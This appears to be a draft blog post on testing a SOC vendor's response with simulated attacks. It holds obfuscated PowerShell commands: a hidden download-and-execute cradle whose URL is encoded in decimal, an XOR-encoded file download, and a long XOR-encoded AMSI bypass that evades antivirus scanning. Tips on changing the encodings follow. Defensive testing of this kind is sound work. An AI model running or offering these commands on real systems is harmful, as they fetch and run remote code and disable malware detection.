---
title: "Testing Your SOC Vendor Repsonse Capabilities"
created: 2026-10-16
modified: 2026-10-16
tags: ["MDE", "SOC", "SIEM"]
draft: true
---

## Introduction

In a organization, the SOC vendor plays a important role to defend the identities, endpoints, and infrastructure from threats. I believe its important to test the SOC vendor once/twice a year to assess the quality of the response capabilities to ensure that the company is receiving the quality of service which they are paying for. In this article, I'll go through ways to assess your SOC vendor response capabilities for endpoints.

## Why PowerShell?

The reason I'm running malicious PowerShell commands instead of malicious executables is because executable programs are blocked through the Attack Surface Reduction Policy which is called for **"Block executable files from running unless they meet a prevalence, age, or trusted list criterion"**. In order to simulate a real scenario, I'm executing PowerShell commands. 

## Load Into Memory (Decimal)

```powershell wrap
# 1. Start PowerShell in bypass mode.
powershell.exe -ep bypass

# 2. Loads malicious PowerShell from https://google.com/xder.ps1 into memory
powershell -w h -c "$v0=1;$m=(@(104,116,116,112,58,47,47,103,111,111,103,108,101,46,99,111,109,47,120,100,101,114,46,112,115,49)|%{[char]$_})-join'';$y=New-Object Net.WebClient;$u=$y.('DownloadStri'+'ng')($m);$k='i'+'e'+'x';&$k $u"
```

This command will try to load a PowerShell Script into the memory. The EDR system will detect it as ClickFix and the SOC vendor should be able to quickly detect that this is a malicious behavior. You can also modify the PowerShell command to increase the complexity by changing the decimal number from `104` to `49` by changing it to a different domain name than `https://google.com/xder.ps1` using [RapidTables](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html).

## Download a File (XOR)

```powershell
# 1. Start PowerShell in bypass mode.
powershell.exe -ep bypass

# 2. Loads malicious PowerShell file from https://google.com/xder.ps1 into memory
powershell -w h -ep b -c '$v28=1;$b=99,68,92,69,65,79,7,125,79,72,88,79,91,95,79,89,94,10,7,127,88,67,10,13,66,94,94,90,16,5,5,77,69,69,77,70,79,4,73,69,71,5,82,78,79,88,4,90,89,27,13;$p=-join($b|%{[char]($_-bxor 0x2a)});iex $p'
```

This command is encrypted using XOR encryption and will be decoded at runtime using the hex code `0x2a`. All this command does is it tries to download a file from `https://google.com/xder2.ps1` using the `Invoke-Webrequest`. You can also increase the complexity of this command by using [Cyberchef](https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'Hex','string':'0x2a'%7D,'Standard',false)To_Decimal('Comma',false)&input=SW52b2tlLVdlYnJlcXVlc3QgLVVyaSBodHRwOi8vZ29vZ2xlLmNvbS5jb20veGRlcjIucHMx&ieol=CRLF) to execute different commands.

## AMSI Bypass (High Severity)

```powershell
# 1. Start PowerShell in bypass mode.
powershell.exe -ep bypass

# 2. Executes AMSI Bypass Command
powershell -w h -ep b -c '$v28=1;$b=107,78,78,7,126,83,90,79,10,7,126,83,90,79,110,79,76,67,68,67,94,67,69,68,10,13,95,89,67,68,77,10,121,83,89,94,79,71,17,95,89,67,68,77,10,121,83,89,94,79,71,4,120,95,68,94,67,71,79,4,99,68,94,79,88,69,90,121,79,88,92,67,73,79,89,17,39,32,90,95,72,70,67,73,10,73,70,75,89,89,10,122,81,113,110,70,70,99,71,90,69,88,94,2,8,65,79,88,68,79,70,25,24,8,6,105,66,75,88,121,79,94,23,105,66,75,88,121,79,94,4,127,68,67,73,69,78,79,3,119,90,95,72,70,67,73,10,89,94,75,94,67,73,10,79,82,94,79,88,68,10,99,68,94,122,94,88,10,102,69,75,78,102,67,72,88,75,88,83,2,89,94,88,67,68,77,10,71,3,17,39,32,113,110,70,70,99,71,90,69,88,94,2,8,65,79,88,68,79,70,25,24,8,3,119,90,95,72,70,67,73,10,89,94,75,94,67,73,10,79,82,94,79,88,68,10,99,68,94,122,94,88,10,109,79,94,122,88,69,73,107,78,78,88,79,89,89,2,99,68,94,122,94,88,10,66,6,89,94,88,67,68,77,10,90,3,17,39,32,113,110,70,70,99,71,90,69,88,94,2,8,65,79,88,68,79,70,25,24,8,3,119,90,95,72,70,67,73,10,89,94,75,94,67,73,10,79,82,94,79,88,68,10,72,69,69,70,10,124,67,88,94,95,75,70,122,88,69,94,79,73,94,2,99,68,94,122,94,88,10,75,6,95,67,68,94,10,89,6,95,67,68,94,10,68,6,69,95,94,10,95,67,68,94,10,69,3,17,39,32,90,95,72,70,67,73,10,89,94,75,94,67,73,10,92,69,67,78,10,114,2,3,81,99,68,94,122,94,88,10,75,23,102,69,75,78,102,67,72,88,75,88,83,2,8,75,71,89,67,4,78,70,70,8,3,17,99,68,94,122,94,88,10,76,23,109,79,94,122,88,69,73,107,78,78,88,79,89,89,2,75,6,8,107,71,89,67,121,73,75,68,104,95,76,76,79,88,8,3,17,39,32,72,83,94,79,113,119,10,72,23,81,26,82,104,18,6,26,82,31,29,6,26,82,26,26,6,26,82,26,29,6,26,82,18,26,6,26,82,105,25,87,17,95,67,68,94,10,69,17,124,67,88,94,95,75,70,122,88,69,94,79,73,94,2,76,6,2,95,67,68,94,3,72,4,102,79,68,77,94,66,6,26,82,30,26,6,69,95,94,10,69,3,17,39,32,103,75,88,89,66,75,70,4,105,69,90,83,2,72,6,26,6,76,6,72,4,102,79,68,77,94,66,3,17,87,87,13,39,32,113,122,119,16,16,114,2,3;$p=-join($b|%{[char]($_-bxor 0x2a)});iex $p'
```

This is currently the most complex PowerShell command as its XOR encrypted and tries to evade EDR system. This should 100% trigger a high security alert at the point where the account and endpoint will be isolated. I would only recommed running this command to test their response capabilities in urgent situations.

## Conclusions

Please be careful with the PowerShell commands since these could easily trigger a security alert. I would recommend Base64 encoding all these PowerShell commands and then decode the Base64 on the endpoint which you're going to run the SOC testing on. Hopefully, this article helps you with testing your SOC vendor. Cheers!